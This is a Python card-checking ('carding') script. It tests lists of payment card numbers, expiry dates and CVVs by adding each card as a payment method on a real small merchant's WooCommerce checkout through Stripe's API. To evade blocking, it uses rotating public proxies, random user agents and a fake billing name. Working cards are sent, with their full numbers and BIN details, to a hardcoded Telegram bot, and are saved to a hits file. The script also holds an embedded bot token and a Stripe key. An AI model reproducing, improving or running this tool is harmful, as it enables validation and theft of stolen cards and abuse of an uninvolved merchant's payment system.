import asyncio
import re
import json
import random
import aiohttp
import uuid
import warnings
from datetime import datetime
from fake_useragent import UserAgent
from colorama import init, Fore, Style
import requests
import threading
import time
from collections import deque

# ==========================================================
# TELEGRAM CONFIG
# ==========================================================
TELEGRAM_TOKEN = "8492367181:AAGFgFtPNTFG60x3238-VDdy7Nc1FNhbVYQ"
CHAT_ID = "1019815845"

# Diccionario completo de banderas (todas las del mundo)
FLAGS = {
    "AF": "🇦🇫", "AL": "🇦🇱", "DZ": "🇩🇿", "AS": "🇦🇸", "AD": "🇦🇩", "AO": "🇦🇴",
    "AR": "🇦🇷", "AM": "🇦🇲", "AU": "🇦🇺", "AT": "🇦🇹", "AZ": "🇦🇿", "BS": "🇧🇸",
    "BH": "🇧🇭", "BD": "🇧🇩", "BB": "🇧🇧", "BY": "🇧🇾", "BE": "🇧🇪", "BZ": "🇧🇿",
    "BJ": "🇧🇯", "BM": "🇧🇲", "BT": "🇧🇹", "BO": "🇧🇴", "BA": "🇧🇦", "BW": "🇧🇼",
    "BR": "🇧🇷", "BN": "🇧🇳", "BG": "🇧🇬", "BF": "🇧🇫", "BI": "🇧🇮", "KH": "🇰🇭",
    "CM": "🇨🇲", "CA": "🇨🇦", "CV": "🇨🇻", "KY": "🇰🇾", "CF": "🇨🇫", "TD": "🇹🇩",
    "CL": "🇨🇱", "CN": "🇨🇳", "CO": "🇨🇴", "KM": "🇰🇲", "CG": "🇨🇬", "CD": "🇨🇩",
    "CR": "🇨🇷", "HR": "🇭🇷", "CU": "🇨🇺", "CY": "🇨🇾", "CZ": "🇨🇿", "DK": "🇩🇰",
    "DJ": "🇩🇯", "DM": "🇩🇲", "DO": "🇩🇴", "EC": "🇪🇨", "EG": "🇪🇬", "SV": "🇸🇻",
    "GQ": "🇬🇶", "ER": "🇪🇷", "EE": "🇪🇪", "ET": "🇪🇹", "FJ": "🇫🇯", "FI": "🇫🇮",
    "FR": "🇫🇷", "GA": "🇬🇦", "GM": "🇬🇲", "GE": "🇬🇪", "DE": "🇩🇪", "GH": "🇬🇭",
    "GR": "🇬🇷", "GD": "🇬🇩", "GT": "🇬🇹", "GN": "🇬🇳", "GW": "🇬🇼", "GY": "🇬🇾",
    "HT": "🇭🇹", "HN": "🇭🇳", "HK": "🇭🇰", "HU": "🇭🇺", "IS": "🇮🇸", "IN": "🇮🇳",
    "ID": "🇮🇩", "IR": "🇮🇷", "IQ": "🇮🇶", "IE": "🇮🇪", "IL": "🇮🇱", "IT": "🇮🇹",
    "JM": "🇯🇲", "JP": "🇯🇵", "JO": "🇯🇴", "KZ": "🇰🇿", "KE": "🇰🇪", "KI": "🇰🇮",
    "KP": "🇰🇵", "KR": "🇰🇷", "KW": "🇰🇼", "KG": "🇰🇬", "LA": "🇱🇦", "LV": "🇱🇻",
    "LB": "🇱🇧", "LS": "🇱🇸", "LR": "🇱🇷", "LY": "🇱🇾", "LI": "🇱🇮", "LT": "🇱🇹",
    "LU": "🇱🇺", "MO": "🇲🇴", "MK": "🇲🇰", "MG": "🇲🇬", "MW": "🇲🇼", "MY": "🇲🇾",
    "MV": "🇲🇻", "ML": "🇲🇱", "MT": "🇲🇹", "MH": "🇲🇭", "MR": "🇲🇷", "MU": "🇲🇺",
    "MX": "🇲🇽", "FM": "🇫🇲", "MD": "🇲🇩", "MC": "🇲🇨", "MN": "🇲🇳", "ME": "🇲🇪",
    "MA": "🇲🇦", "MZ": "🇲🇿", "MM": "🇲🇲", "NA": "🇳🇦", "NR": "🇳🇷", "NP": "🇳🇵",
    "NL": "🇳🇱", "NZ": "🇳🇿", "NI": "🇳🇮", "NE": "🇳🇪", "NG": "🇳🇬", "NO": "🇳🇴",
    "OM": "🇴🇲", "PK": "🇵🇰", "PW": "🇵🇼", "PA": "🇵🇦", "PG": "🇵🇬", "PY": "🇵🇾",
    "PE": "🇵🇪", "PH": "🇵🇭", "PL": "🇵🇱", "PT": "🇵🇹", "QA": "🇶🇦", "RO": "🇷🇴",
    "RU": "🇷🇺", "RW": "🇷🇼", "KN": "🇰🇳", "LC": "🇱🇨", "VC": "🇻🇨", "WS": "🇼🇸",
    "SM": "🇸🇲", "ST": "🇸🇹", "SA": "🇸🇦", "SN": "🇸🇳", "RS": "🇷🇸", "SC": "🇸🇨",
    "SL": "🇸🇱", "SG": "🇸🇬", "SK": "🇸🇰", "SI": "🇸🇮", "SB": "🇸🇧", "SO": "🇸🇴",
    "ZA": "🇿🇦", "ES": "🇪🇸", "LK": "🇱🇰", "SD": "🇸🇩", "SR": "🇸🇷", "SZ": "🇸🇿",
    "SE": "🇸🇪", "CH": "🇨🇭", "SY": "🇸🇾", "TW": "🇹🇼", "TJ": "🇹🇯", "TZ": "🇹🇿",
    "TH": "🇹🇭", "TL": "🇹🇱", "TG": "🇹🇬", "TO": "🇹🇴", "TT": "🇹🇹", "TN": "🇹🇳",
    "TR": "🇹🇷", "TM": "🇹🇲", "TV": "🇹🇻", "UG": "🇺🇬", "UA": "🇺🇦", "AE": "🇦🇪",
    "GB": "🇬🇧", "US": "🇺🇸", "UY": "🇺🇾", "UZ": "🇺🇿", "VU": "🇻🇺", "VA": "🇻🇦",
    "VE": "🇻🇪", "VN": "🇻🇳", "YE": "🇾🇪", "ZM": "🇿🇲", "ZW": "🇿🇼"
}

# ==========================================================
# SEND TELEGRAM MESSAGE
# ==========================================================
async def send_telegram_msg(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, json=payload) as resp:
                if resp.status != 200:
                    print(f"{Fore.YELLOW}⚠️ Telegram no enviado{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}✅ Telegram enviado{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Error Telegram: {e}{Style.RESET_ALL}")

async def get_bin_info(cc):
    bin_num = cc[:6]
    url = f"https://data.handyapi.com/bin/{bin_num}"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, timeout=8) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    country_data = data.get('Country', {})
                    code = country_data.get('A2', '').upper()
                    name = country_data.get('Name', 'Unknown')
                    brand = data.get('CardTier', data.get('Brand', 'Unknown'))
                    type_c = data.get('Type', 'Unknown')
                    flag = FLAGS.get(code, "🏳️")
                    return f"{name} {flag}", brand, type_c
        except Exception as e:
            print(f"{Fore.YELLOW}BIN lookup error: {e}{Style.RESET_ALL}")
    
    return "Unknown 🏳️", "Unknown", "Unknown"

# ==========================================================
# NUEVA PROXY POOL - OpenBullet Style
# ==========================================================
class Proxy:
    def __init__(self, proxy_str: str):
        self.proxy = proxy_str.strip()
        self.uses = 0
        self.strikes = 0
        self.available = True

class ProxyPool:
    def __init__(self, url: str):
        self.url = url
        self.proxies = deque()
        self.lock = threading.Lock()
        self.is_reloading = False

    def load_proxies(self):
        with self.lock:
            if self.is_reloading: return
            self.is_reloading = True

        print(f"{Fore.CYAN}[ProxyPool] Recargando desde {self.url}{Style.RESET_ALL}")
        try:
            resp = requests.get(self.url, timeout=20)
            new_proxies = re.findall(r'[0-9]{1,3}(?:\.[0-9]{1,3}){3}:[0-9]{1,5}', resp.text)
            with self.lock:
                for p in new_proxies:
                    self.proxies.append(Proxy(p))
                print(f"{Fore.GREEN}[ProxyPool] Cargados {len(new_proxies)} proxies{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[ProxyPool] Error: {e}{Style.RESET_ALL}")
        finally:
            with self.lock:
                self.is_reloading = False

    def get_proxy(self):
        with self.lock:
            while self.proxies:
                p = self.proxies.popleft()
                if p.available:
                    p.available = False
                    return p
            return None

    def release_proxy(self, proxy: Proxy, success: bool = False):
        if not proxy: return
        with self.lock:
            proxy.uses += 1
            if success:
                proxy.strikes = 0
            else:
                proxy.strikes += 1
            proxy.available = True
            if proxy.strikes >= 3:
                print(f"{Fore.RED}[ProxyPool] Baneado: {proxy.proxy}{Style.RESET_ALL}")
                return
            self.proxies.append(proxy)

# ==========================================================
# STRIPE CHECK
# ==========================================================
async def process_stripe_card(card_data, proxy_obj=None):
    ua = UserAgent()
    site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
    proxy_url = f"http://{proxy_obj.proxy}" if proxy_obj else None

    try:
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            headers = {
                'user-agent': ua.random,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }

            # 1. Get main page
            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
            text = await resp.text()

            # Extract nonces and keys
            add_card_nonce = gets(text, 'woocommerce-add-payment-method-nonce" value="', '"') or gets(text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            stripe_key = gets(text, '"key":"pk_', '"') or gets(text, 'pk_live_', '"')

            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'

            # 2. Register / Login (si es necesario)
            # ... (mantén tu código de register si lo tienes)

            # 3. Create Payment Method
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': ua.random
            }

            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'billing_details[name]': 'Lucas Hernandez',
                'billing_details[address][country]': 'MX',
                'allow_redisplay': 'unspecified',
                'key': stripe_key
            }

            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', 
                                        headers=stripe_headers, 
                                        data=stripe_data, 
                                        proxy=proxy_url)
            pm_json = await pm_resp.json()

            if 'error' in pm_json:
                return False, pm_json['error'].get('message', 'Declined')

            pm_id = pm_json.get('id')
            if not pm_id:
                return False, 'No Payment Method ID'

            # 4. Confirm Setup Intent
            confirm_data = {
                'wc-stripe-payment-method': pm_id,
                'woocommerce-add-payment-method-nonce': add_card_nonce,
                'wc-stripe-payment-type': 'card'
            }

            confirm_resp = await session.post(
                f"{site_url}", 
                data=confirm_data, 
                headers=headers, 
                proxy=proxy_url
            )
            confirm_text = await confirm_resp.text()

            if 'success' in confirm_text.lower() or pm_id in confirm_text:
                return True, "Approved"
            else:
                return False, "Declined by Site"

    except Exception as e:
        return False, f"Error: {str(e)[:100]}"

# ==========================================================
# CHECK CARD
# ==========================================================
async def check_card(cc, mes, ano, cvv, pool: ProxyPool):
    proxy = pool.get_proxy()
    is_live, response_msg = await process_stripe_card({'number':cc, 'exp_month':mes, 'exp_year':ano, 'cvc':cvv}, proxy)
    full_cc = f"{cc}|{mes}|{ano}|{cvv}"
    
    if is_live:
        country, brand, type_c = await get_bin_info(cc)
        
        # Mensaje más inteligente
        gateway_msg = response_msg
        if "success" in response_msg.lower() or "approved" in response_msg.lower():
            gateway_msg = "Approved ($0 Charge)"
        elif "3ds" in response_msg.lower() or "authenticate" in response_msg.lower():
            gateway_msg = "3D Secure Required"
        elif "declined" in response_msg.lower():
            gateway_msg = "Declined by Bank"
        
        tg_text = (
            f"<b>🔥 STRIPE AUTH LIVE HIT 🔥</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>💳 Card:</b> <code>{full_cc}</code>\n"
            f"<b>🌍 Country:</b> {country}\n"
            f"<b>🏦 Brand:</b> {brand}\n"
            f"<b>🔰 Type:</b> {type_c}\n"
            f"<b>✅ Result:</b> Approved\n"
            f"<b>💬 Gateway:</b> {gateway_msg}\n"
            f"<b>🕒 Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"<b>🔄 Proxy:</b> {proxy.proxy if proxy else 'No Proxy'}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<i>Auto Proxy System</i>"
        )
        await send_telegram_msg(tg_text)
        
        if proxy: 
            pool.release_proxy(proxy, success=True)
        return {'cc': full_cc, 'status': f'{Fore.GREEN}✅ Approved', 'is_live': True}
    
    if proxy: pool.release_proxy(proxy, success=False)
    return {'cc': full_cc, 'status': f'{Fore.RED}❌ Declined', 'is_live': False}

# ==========================================================
# MASS CHECK
# ==========================================================
async def mass_check(file_path, pool: ProxyPool, concurrency=5):
    try:
        with open(file_path, 'r') as f:
            cc_lines = [l.strip() for l in f if l.strip()]
    except:
        print(f"{Fore.RED}❌ File not found."); return

    sem = asyncio.Semaphore(concurrency)
    completed = 0
    lives = 0

    async def worker(line):
        nonlocal completed, lives
        async with sem:
            parts = line.split('|')
            if len(parts) < 4: return
            res = await check_card(parts[0], parts[1], parts[2], parts[3], pool)
            completed += 1
            if res['is_live']:
                lives += 1
                with open('hits.txt', 'a') as f: f.write(f"{res['cc']}\n")
            print(f"{Fore.CYAN}[{completed}/{len(cc_lines)}] {res['cc']} → {res['status']}")

    await asyncio.gather(*(worker(l) for l in cc_lines))
    await send_telegram_msg(f"🏁 <b>Session Finished</b>\n✅ Hits: {lives}")

# ==========================================================
# MAIN MENU
# ==========================================================
def print_menu():
    print(f"""
{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════╗
║     STRIPE CHECKER + AUTO PROXIES    ║
╚══════════════════════════════════════╝{Style.RESET_ALL}
1. Single Check
2. Mass Check
3. Exit
""")

async def main():
    # ←←← CAMBIA ESTA URL SI QUIERES ←←←
    proxy_url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    
    pool = ProxyPool(proxy_url)
    pool.load_proxies()  # Carga inicial

    while True:
        print_menu()
        choice = input(f"{Fore.GREEN}Select: {Style.RESET_ALL}").strip()
        if choice == '1':
            cc_in = input("cc|mm|yy|cvv: ").strip()
            parts = cc_in.split('|')
            if len(parts) == 4:
                res = await check_card(parts[0], parts[1], parts[2], parts[3], pool)
                print(res['status'])
        elif choice == '2':
            path = input("File path: ").strip()
            await mass_check(path, pool)
        elif choice == '3':
            break

if __name__ == "__main__":
    init(autoreset=True)
    asyncio.run(main())
